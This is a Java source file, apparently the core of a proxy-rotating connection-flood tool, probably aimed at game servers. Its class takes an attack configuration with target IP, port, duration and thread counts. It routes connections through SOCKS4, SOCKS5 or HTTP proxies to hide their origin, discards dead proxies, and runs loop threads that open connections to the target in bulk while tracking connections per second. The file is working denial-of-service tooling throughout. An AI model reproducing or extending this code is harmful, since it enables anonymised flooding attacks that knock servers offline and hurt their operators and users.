package dev.lastknell.core;

import java.net.InetSocketAddress;
import java.util.concurrent.ThreadFactory;

import dev.lastknell.core.methods.IMethod;
import dev.lastknell.core.proxy.Proxy;
import dev.lastknell.core.proxy.ProxyManager;
import io.netty.bootstrap.Bootstrap;
import io.netty.channel.Channel;
import io.netty.channel.ChannelHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.ChannelOption;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.epoll.EpollEventLoopGroup;
import io.netty.channel.epoll.EpollSocketChannel;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.proxy.HttpProxyHandler;
import io.netty.handler.proxy.Socks4ProxyHandler;
import io.netty.handler.proxy.Socks5ProxyHandler;
import io.netty.util.ResourceLeakDetector;

public class NettyBootstrap {

    // Attack Config
    public final String srvIp;
    public final int port;
    private final IMethod method;
    private final int duration;
    private final int perDelay;
    private final int delay;
    private final int loopThreads;
    private final int workerThreads;
    public final int proxyType = 0;
    public final int protocolID;
    public static Class<? extends Channel> socketChannel;

    // IDK WHAT TO TYPE HERE
    private ProxyManager proxyManager;
    public volatile int triedCPS = 0;
    public volatile int oppnedCPS = 0;
    public volatile int successfulCPS = 0;
    public volatile int totalCPS = 0;
    public volatile int averageCPS = 0;

    private boolean shouldStop = false;

    // Netty related
    private EventLoopGroup loopGroup = null;

    private final ChannelHandler TAIL = new ChannelHandler() {
        @Override
        public void handlerAdded(ChannelHandlerContext ctx) throws Exception {

        }

        @Override
        public void handlerRemoved(ChannelHandlerContext ctx) throws Exception {

        }

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {
            ctx.close();
        }
    };
    // HTTP
    private final ChannelInitializer<Channel> HTTP = new ChannelInitializer<Channel>() {
        public void channelInactive(ChannelHandlerContext ctx) {
            ctx.channel().close();
        }

        protected void initChannel(final Channel c) {
            try {
                final Proxy proxy = proxyManager.getProxy();
                final HttpProxyHandler s = (proxy.email != null)
                        ? new HttpProxyHandler(proxy.address, proxy.email, proxy.pw)
                        : new HttpProxyHandler(proxy.address);
                s.setConnectTimeoutMillis(5000L);
                s.connectFuture().addListener(f -> {
                    if (f.isSuccess() && s.isConnected()) {
                        triedCPS++;
                        method.accept(c, proxy);
                    } else {
                        proxyManager.removeProxy(proxy);
                        c.close();
                    }
                });
                c.pipeline().addFirst(s).addLast(TAIL);
            } catch (Exception e) {
                c.close();
            }
        }

        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    };
    // SOCKS4
    private final ChannelInitializer<Channel> SOCKS4 = new ChannelInitializer<Channel>() {
        public void channelInactive(ChannelHandlerContext ctx) {
            ctx.channel().close();
        }

        protected void initChannel(final Channel c) {
            try {
                final Proxy proxy = proxyManager.getProxy();
                final Socks4ProxyHandler s = (proxy.email != null) ? new Socks4ProxyHandler(proxy.address, proxy.email)
                        : new Socks4ProxyHandler(proxy.address);
                s.setConnectTimeoutMillis(5000L);
                s.connectFuture().addListener(f -> {
                    if (f.isSuccess() && s.isConnected()) {
                        triedCPS++;
                        method.accept(c, proxy);
                    } else {
                        proxyManager.removeProxy(proxy);
                        c.close();
                    }
                });
                c.pipeline().addFirst(s).addLast(TAIL);
            } catch (Exception e) {
                c.close();
            }
        }

        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {
            ctx.close();
        }
    };
    // SOCKS5
    public final ChannelInitializer<Channel> SOCKS5 = new ChannelInitializer<Channel>() {
        public void channelInactive(ChannelHandlerContext ctx) {
            ctx.channel().close();
        }

        protected void initChannel(final Channel c) {
            try {
                final Proxy proxy = proxyManager.getProxy();
                final Socks5ProxyHandler s = (proxy.email != null && proxy.pw != null)
                        ? new Socks5ProxyHandler(proxy.address, proxy.email, proxy.pw)
                        : new Socks5ProxyHandler(proxy.address);
                s.setConnectTimeoutMillis(5000L);
                s.connectFuture().addListener(f -> {
                    if (f.isSuccess() && s.isConnected()) {
                        triedCPS++;
                        method.accept(c, proxy);
                    } else {
                        proxyManager.removeProxy(proxy);
                        c.close();
                    }
                });
                c.pipeline().addFirst(s).addLast(TAIL);
            } catch (Exception e) {
                c.close();
            }
        }

        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {
            ctx.close();
        }
    };

    // BOOTSTRAP
    private Bootstrap BOOTSTRAP;

    /**
     * @param attackConfig Attack Config
     * @param proxyManager Proxy Manager
     */
    public NettyBootstrap(AttackConfig attackConfig, ProxyManager proxyManager) {
        this.method = attackConfig.getMethod();
        this.srvIp = attackConfig.getSrvIp();
        this.port = attackConfig.getPort();
        this.duration = attackConfig.getDuration();
        this.perDelay = attackConfig.getPerDelay();
        this.delay = attackConfig.getDelay();
        this.loopThreads = attackConfig.getLoopThreads();
        this.workerThreads = attackConfig.getWorkerThreads();
        this.proxyManager = proxyManager;
        this.protocolID = attackConfig.getProtocolID();
        this.method.init(this);

        if (attackConfig.isUsingEpoll()) {

            socketChannel = EpollSocketChannel.class;
            loopGroup = new EpollEventLoopGroup(workerThreads, new ThreadFactory() {
                public Thread newThread(Runnable r) {
                    Thread t = new Thread(r);
                    t.setDaemon(true);
                    t.setPriority(5);
                    return t;
                }
            });

        } else {
            socketChannel = NioSocketChannel.class;
            loopGroup = new NioEventLoopGroup(workerThreads, new ThreadFactory() {
                public Thread newThread(Runnable r) {
                    Thread t = new Thread(r);
                    t.setDaemon(true);
                    t.setPriority(10);
                    return t;
                }
            });
        }

        switch (proxyType) {
            case 0:
                BOOTSTRAP = (new Bootstrap()).channel(socketChannel).group(loopGroup)
                        .option(ChannelOption.TCP_NODELAY, Boolean.TRUE).option(ChannelOption.AUTO_READ, Boolean.TRUE)
                        .handler(SOCKS4);
                break;
            case 1:
                BOOTSTRAP = (new Bootstrap()).channel(socketChannel).group(loopGroup)
                        .option(ChannelOption.TCP_NODELAY, Boolean.TRUE).option(ChannelOption.AUTO_READ, Boolean.TRUE)
                        .handler(SOCKS5);
                break;
            case 2:
                BOOTSTRAP = (new Bootstrap()).channel(socketChannel).group(loopGroup)
                        .option(ChannelOption.TCP_NODELAY, Boolean.TRUE).option(ChannelOption.AUTO_READ, Boolean.TRUE)
                        .handler(HTTP);
                break;
            default:
                System.out.println("BRO WTF USE PROXY\nInfo: 0 -> Socks4Proxy, 1 -> Socks5Proxy, 2 -> HttpProxy");
        }
    }

    public void start() {
        ResourceLeakDetector.setLevel(ResourceLeakDetector.Level.SIMPLE);

        Thread Counter = new Thread(() -> {
            int elapsed = 0;
            while (!shouldStop) {
                elapsed++;
                if (elapsed > duration) {
                    shouldStop = true;
                    stop();
                    break;
                }
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                }
                totalCPS += successfulCPS;
                oppnedCPS = 0;
                successfulCPS = 0;
                triedCPS = 0;
                averageCPS = totalCPS / elapsed;
            }
        });
        Counter.start();

        for (int i = 0; i < loopThreads; i++) {

            (new Thread(() -> {
                InetSocketAddress addr = new InetSocketAddress(srvIp, port);
                while (!shouldStop) {

                    for (int j = 0; j < perDelay; j++) {
                        BOOTSTRAP.connect(addr);
                    }

                    try {
                        Thread.sleep(delay);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                }
            })).start();
        }
    }

    public void stop() {
        shouldStop = true;
        loopGroup.shutdownGracefully();
    }

}
